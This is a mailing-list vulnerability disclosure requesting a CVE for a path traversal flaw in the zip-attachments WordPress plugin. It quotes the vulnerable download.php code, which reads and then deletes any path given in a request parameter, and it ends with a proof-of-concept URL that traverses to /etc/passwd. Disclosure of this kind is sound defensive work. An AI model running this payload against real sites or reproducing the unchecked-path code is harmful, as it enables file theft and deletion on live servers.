May I please have a CVE for this issue:  Title: zip-attachments wordpress plugin arbitrary file download vulnerability. Author: Larry W. Cashdollar Date: Vendor: Rick Torres @ricard_dev Vendor Notified: Fixed in:   by vendor. Download: https://wordpress.org/plugins/zip-attachments/ CVEID: TBD Description: Simple and lightweight plugin to add a "Download" button to your posts, pages or custom post types.  Vulnerability: zip-attachments allows arbitrary file downloads because it doesn't check the download path of the requested file.  In zip-attachments/download.php, there is no check to see if the file is outside of the intended download path:    8 if(isset($_REQUEST['za_file']) && !empty($_REQUEST['za_file'])){   9   10     $file = $_GET['za_file'];  11     $filename = $_GET['za_filename'];  12   13     header('Content-Type: application/zip');  14     header('Content-Length: ' . filesize($file));  15     header('Content-Disposition: attachment; filename="'.$filename.'.zip"');  16   17     readfile($file);  18     unlink($file);  Any file readable by the httpd process can be downloaded.  PoC: http://www.example.com/wp-content/plugins/zip-attachments/download.php?za_file=../../../../../etc/passwd&za_filename=passwd    Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.
